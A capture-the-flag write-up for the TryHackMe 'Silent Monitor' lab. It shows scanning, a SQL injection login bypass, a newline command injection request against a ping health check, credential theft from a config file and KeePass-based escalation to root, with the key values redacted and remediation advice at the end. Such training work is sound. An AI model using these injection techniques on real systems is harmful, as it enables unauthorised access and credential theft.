# Silent Monitor Challenge

*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Jr Pentester Challenges* | **Challenge:** *[Silent Monitor](https://tryhackme.com/room/silent-monitor)*

> [!IMPORTANT]
>
> **Spoiler warning:** This writeup contains part of the exploitation chain, however no flag codes are shown in this write-up!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> The following placeholders are used throughout this writeup:
>
>: `<TARGET_IP>` represents the IP address allocated to the target host when the room was started.
>: `<TUN0_IP>` represents the IP address allocated to my Kali Linux `tun0` interface while connected to the TryHackMe VPN.
>: `<REDACTED>` represents credentials, passwords, sensitive file contents, exact exploit values or anything else that would directly give away the challenge.
>: `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

The objective of this challenge was to enumerate an internal monitoring portal, exploit weaknesses in the web application, recover access to the underlying host and escalate privileges to root.

The successful attack chain involved:

1. Confirming the TryHackMe VPN route and the local `tun0` address.
2. Adding the target hostname to `/etc/hosts`.
3. Enumerating the target and identifying SSH and a Python Werkzeug web service.
4. Discovering the internal login portal.
5. Bypassing authentication through SQL injection.
6. Accessing the authenticated Host Health feature.
7. Exploiting newline command injection in the `target` parameter.
8. Reading an exposed application configuration file.
9. Recovering valid SSH credentials.
10. Logging in as a standard user and retrieving `user.txt`.
11. Identifying and transferring a KeePass database.
12. Opening the database with KeePassXC CLI.
13. Recovering the root password.
14. Switching to root and retrieving `root.txt`.

Confirmed lab details used during the walkthrough:

```text
Target IP Address: <TARGET_IP>
Kali tun0 IP Address: <TUN0_IP>
Provisioned Hostname: silent-monitor.thm
Attacker Working Directory: /tmp/VK
```

The target IP address was added to the local hosts file so the hostname resolved correctly from the Kali VM:

```bash
echo "<TARGET_IP> silent-monitor.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed using:

```bash
getent hosts silent-monitor.thm
```

The VPN route and local tunnel interface were also checked:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali VM, the `/etc/hosts` file is especially important in these TryHackMe challenges. Many rooms rely on hostname-based routing, virtual hosts, redirects, cookies or application logic that will not behave correctly if the hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with old lab entries, so it is advantageous to keep it clear, tidy and focused on the challenge currently being worked on.
>
> A messy hosts file is basically DNS spaghetti: technically edible, but nobody sensible wants it.

The file can be reviewed using:

```bash
cat /etc/hosts
```

An old challenge entry can be removed with:

```bash
sudo sed -i '/silent-monitor\.thm/d' /etc/hosts
```

The correct entry can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The main tools used were:

* `ip` for confirming the VPN route and the local `tun0` address.
* `ping` for confirming hostname resolution and target reachability.
* `rustscan` for fast TCP port discovery.
* `nmap` for full-port discovery and targeted service enumeration.
* `dirsearch`, `gobuster` and `feroxbuster` for web content discovery.
* `curl` for direct HTTP interaction, form submission, cookie handling and command injection testing.
* `grep` and `sed` for filtering HTML responses and command output.
* `nxc` for verifying recovered SSH credentials.
* `ssh` for interactive access to the target.
* `scp` for transferring the KeePass database to Kali.
* `keepass2john` for attempting KeePass hash extraction.
* `keepassxc-cli` for opening and reviewing the KeePass database.
* Standard Linux commands such as `whoami`, `id`, `hostname`, `ls`, `cat` and `su`.

Click [HERE](https://github.com/Valikahn/TryHackMe-Jr-Penetration-Tester#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to the tools used throughout the pathway.

## Initial Enumeration

### Confirming Connectivity

The route to the target was checked first:

```bash
ip route get <TARGET_IP>
```

The output confirmed that the target was reached through `tun0` and that the local VPN source address was `<TUN0_IP>`.

The interface was then checked directly:

```bash
ip -br address show tun0
```

The configured hostname was confirmed:

```bash
getent hosts silent-monitor.thm
```

The target responded successfully to ICMP:

```bash
ping -c 4 silent-monitor.thm
```

### Port Discovery

A fast scan was performed with RustScan:

```bash
rustscan -b 500 -a silent-monitor.thm --top -- -sC -sV -Pn
```

The scan identified two open ports:

```text
22/tcp   open  ssh
5050/tcp open  http
```

The web service on port `5050` was identified as a Werkzeug HTTP server running on Python.

A standard Nmap scan was also performed:

```bash
nmap -sC -sV -Pn -oN nmap_output.txt silent-monitor.thm
```

A full TCP port scan confirmed that no additional services were exposed:

```bash
nmap -Pn -p- -sC -sV --min-rate 2000 \
  -oA silent-monitor-allports \
  silent-monitor.thm
```

The important findings were:

```text
22/tcp   open  ssh   OpenSSH
5050/tcp open  http  Werkzeug httpd
```

The HTTP title identified the service as the CorpNet Network Operations Centre portal.

### Web Content Discovery

The web application was reviewed at:

```text
http://silent-monitor.thm:5050/
```

The page presented a corporate monitoring portal.

Directory discovery was performed with `dirsearch`:

```bash
dirsearch -u http://silent-monitor.thm:5050/
```

This identified:

```text
/internal
```

The result was confirmed with Gobuster:

```bash
gobuster dir \
  -u http://silent-monitor.thm:5050/ \
  -w /usr/share/wordlists/dirb/big.txt
```

Further enumeration was performed against the internal path:

```bash
gobuster dir \
  -u http://silent-monitor.thm:5050/internal/ \
  -w /usr/share/wordlists/dirb/big.txt
```

The following routes were discovered:

```text
/internal/dashboard
/internal/health
/internal/logout
```

Direct requests to the dashboard and health routes redirected unauthenticated users back to `/internal`.

The internal login page was retrieved with:

```bash
curl -s -i http://silent-monitor.thm:5050/internal
```

The form submitted the following parameters:

```text
username
password
```

## Exploits

### SQL Injection Authentication Bypass

Initial SQL injection payloads using double quotes failed and returned:

```text
Invalid username or password.
```

The application was instead vulnerable through a single-quote SQL injection payload.

The exact working value has been redacted:

```bash
curl -i -s -c cookies.txt -X POST \
  --data-urlencode "username=<REDACTED>" \
  --data-urlencode "password=<REDACTED>" \
  http://silent-monitor.thm:5050/internal
```

The server returned:

```text
HTTP/1.0 302 FOUND
Location: http://silent-monitor.thm:5050/internal/dashboard
Set-Cookie: session=<REDACTED>
```

This confirmed that the authentication bypass had succeeded.

The returned session identified an operator-level account. The cookie was stored in:

```text
cookies.txt
```

### Reviewing the Authenticated Dashboard

The dashboard was downloaded using the saved session:

```bash
curl -s -b cookies.txt \
  http://silent-monitor.thm:5050/internal/dashboard \
  -o dashboard.html
```

Useful links and references were extracted:

```bash
grep -iE 'href=|src=|api|health|host|monitor|internal' dashboard.html
```

The output confirmed the authenticated Host Health feature:

```text
/internal/health
```

### Inspecting the Host Health Form

The page was downloaded:

```bash
curl -s -b cookies.txt \
  http://silent-monitor.thm:5050/internal/health \
  -o health.html
```

The form details were extracted:

```bash
grep -iE 'form|input|name=|method=|action=|host|ping' health.html
```

The relevant form information was:

```text
POST /internal/health
Parameter: target
```

The page described the function as an ICMP reachability probe.

### Confirming Command Injection

The application placed the supplied `target` value into a system `ping` command.

A URL-encoded newline allowed a second command to be appended after the target value.

A harmless `id` command was used to confirm command execution:

```bash
curl -s -b cookies.txt -X POST \
  --data 'target=127.0.0.1%0a<REDACTED>' \
  http://silent-monitor.thm:5050/internal/health
```

The returned output contained the expected ping results followed by:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed command execution as the `www-data` service account.

### Reading the Application Configuration

An initial filesystem-wide `find` command took longer than the application's execution window and returned:

```text
[process running in background]
```

The application directory was then targeted directly.

A sensitive configuration file was read through the command injection:

```bash
curl -s -b cookies.txt -X POST \
  --data 'target=127.0.0.1%0acat%20<REDACTED>' \
  http://silent-monitor.thm:5050/internal/health
```

The file contained application settings and a backup service account:

```text
[backup_agent]
run_as   = <REDACTED>
password = <REDACTED>
```

The recovered username and password have been redacted from this public write-up.

### Verifying SSH Access

The recovered credentials were tested with NetExec:

```bash
nxc ssh silent-monitor.thm \
  -u '<REDACTED>' \
  -p '<REDACTED>'
```

The result confirmed valid shell access:

```text
[+] <REDACTED>:<REDACTED> Linux - Shell access!
```

### Accessing the Target Through SSH

An interactive SSH connection was established:

```bash
ssh <REDACTED>@silent-monitor.thm
```

The account context was confirmed:

```bash
whoami
id
hostname
```

The results showed that the shell belonged to a standard local user.

The home directory contained:

```text
backups
user.txt
```

The user flag was read:

```bash
cat user.txt
```

The flag value has been intentionally redacted from this public write-up.

```text
THM{....}
```

### Reviewing the Backup Directory

The backup directory contained:

```text
README.txt
infrastructure.kdbx
```

The README described the `.kdbx` file as a KeePass infrastructure credential database.

The database was binary, so using `cat` only displayed unreadable data and did not provide useful information.

### Transferring the KeePass Database

The KeePass database was copied to the Kali working directory:

```bash
scp <REDACTED>@silent-monitor.thm:/home/<REDACTED>/backups/infrastructure.kdbx /tmp/VK/
```

The copied file was then available locally as:

```text
/tmp/VK/infrastructure.kdbx
```

### Attempting KeePass Hash Extraction

An attempt was made to extract the KeePass hash:

```bash
keepass2john infrastructure.kdbx > infrastructure.hash
```

The installed version returned:

```text
File version '<REDACTED>' is currently not supported
```

This confirmed a tooling limitation rather than a corrupt database.

### Opening the KeePass Database

KeePassXC CLI was used instead:

```bash
printf '<REDACTED>\n' | keepassxc-cli ls infrastructure.kdbx
```

The database opened successfully and displayed several groups along with a sensitive privileged entry.

The entry was inspected using:

```bash
printf '<REDACTED>\n' | \
  keepassxc-cli show -s \
  infrastructure.kdbx \
  "<REDACTED>"
```

The output contained:

```text
UserName: root
Password: <REDACTED>
```

The database password, entry title and root password have been intentionally redacted.

### Privilege Escalation

The recovered root password was tested from the existing SSH session:

```bash
su -
```

Authentication succeeded and the shell prompt changed to root.

The root context was confirmed:

```bash
whoami
id
```

The root home directory contained:

```text
root.txt
```

The final flag was read:

```bash
cat /root/root.txt
```

The flag value has been intentionally redacted from this public write-up.

```text
THM{....}
```

## Full Attack Chain Recap

### 1. Local hostname provisioning
The target IP address was mapped to `silent-monitor.thm` in `/etc/hosts`. This ensured that redirects, cookies and hostname-dependent application behaviour worked correctly from the Kali VM.

### 2. Service enumeration
RustScan and Nmap identified two exposed TCP services: SSH on port `22` and a Werkzeug Python web application on port `5050`.

### 3. Internal portal discovery
Directory enumeration identified `/internal`, followed by the protected `/internal/dashboard`, `/internal/health` and `/internal/logout` routes.

### 4. SQL injection authentication bypass
The internal login form was vulnerable to SQL injection through the username field. A single-quote payload changed the authentication query, returned a valid session cookie and redirected the request to the internal dashboard.

### 5. Authenticated feature enumeration
The authenticated dashboard exposed the Host Health feature. Reviewing the form showed that the application submitted a `target` parameter to `/internal/health`.

### 6. Newline command injection
The Host Health feature passed the supplied value into a system `ping` command. A URL-encoded newline allowed a second command to be executed, confirming command execution as `www-data`.

### 7. Sensitive configuration disclosure
The command injection was used to read the application configuration. The file exposed a backup service account username and plaintext password.

### 8. SSH access
The recovered credentials were verified against SSH and provided an interactive shell as a standard local user.

### 9. User flag and backup discovery
The user flag was retrieved from the compromised account's home directory. Further local enumeration identified a KeePass database inside the `backups` directory.

### 10. KeePass database access
The database was transferred to Kali. Although `keepass2john` did not support the database version, KeePassXC CLI opened it successfully using the recovered database password.

### 11. Root credential recovery
A sensitive KeePass entry disclosed the root username and password.

### 12. Root access
The recovered password was supplied to `su -`, providing a root shell. The final flag was then retrieved from `/root/root.txt`.

## Key Lessons

This challenge demonstrated several important penetration testing lessons:

- Hostname Resolution Matters: Some web applications depend on hostname-based routing, redirects, cookies or virtual host configuration. Maintaining the correct `/etc/hosts` entry was essential for reliable testing.
- Keep `/etc/hosts` Tidy: Old TryHackMe entries can cause duplicate mappings, stale routes and confusing behaviour. Keeping the file focused on the active room reduces avoidable troubleshooting.
- SQL Injection Depends on Query Context: The unsuccessful double-quote attempts showed that payload syntax must match the way the backend query is constructed. A single quote successfully closed the username string.
- Authentication Success Must Be Verified: A `200 OK` response containing the login page was not a successful bypass. The reliable indicators were the `302` redirect, session cookie and access to the protected dashboard.
- Diagnostic Features Are Dangerous: Functions built around tools such as `ping`, `traceroute` or `nslookup` can become command injection points when user input reaches a shell.
- Encoded Control Characters Can Bypass Filters: The URL-encoded newline separated the expected hostname from the injected command even though more obvious shell separators were not used.
- Configuration Files Often Contain Credentials: Once command execution was achieved, the application configuration provided the next set of credentials required for lateral movement.
- Password Reuse and Plaintext Storage Increase Impact: A service credential stored in plaintext directly enabled SSH access.
- Use the Correct Tool for Binary Files: A KeePass database cannot be meaningfully reviewed with `cat`. The correct database-aware tooling was required.
- One Tool Failing Does Not End the Attack Path: `keepass2john` could not process the database version, but KeePassXC CLI provided a working alternative.
- Credential Vaults Still Require Strong Protection: An encrypted password database becomes ineffective if its master password is weak, exposed or recoverable and the database is accessible to an unprivileged user.

## Remediation Notes

The vulnerabilities in this lab could be mitigated by:

- Prevent SQL Injection: Use parameterised queries or prepared statements for authentication and all other database operations. Client input must never be concatenated into SQL statements.
- Store Passwords Securely: Application passwords should be hashed using a modern password-hashing algorithm such as Argon2id or bcrypt. Plaintext passwords should not be stored in the database or configuration files.
- Remove Shell-Based Health Checks: The application should invoke `ping` through a safe argument list without `shell=True`. User input should be validated as a strict IP address or hostname before execution.
- Reject Control Characters: Newlines, carriage returns, whitespace and shell metacharacters should be rejected before a diagnostic request is processed.
- Protect Application Secrets: Service credentials should be stored in a dedicated secrets manager or injected securely at runtime. Configuration files should use restrictive permissions and should not be readable by the web service account unless strictly required.
- Apply Least Privilege: The `www-data` account should have access only to the files and commands required by the application. It should not be able to read sensitive credentials or user backup files.
- Harden SSH: Prefer key-based authentication, restrict interactive login for service accounts and limit SSH access to authorised users and trusted network paths.
- Protect KeePass Databases: Use a long and unique master passphrase, strict filesystem permissions and an additional key file or hardware-backed factor where appropriate.
- Avoid Shared Root Passwords: Administrative access should use named user accounts and controlled `sudo` permissions rather than a reusable root password.
- Improve Monitoring: Alert on SQL injection patterns, encoded control characters, unexpected child processes from the web service, sensitive file access, unusual SSH logins and use of `su` to obtain root.

## Disclaimer

This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
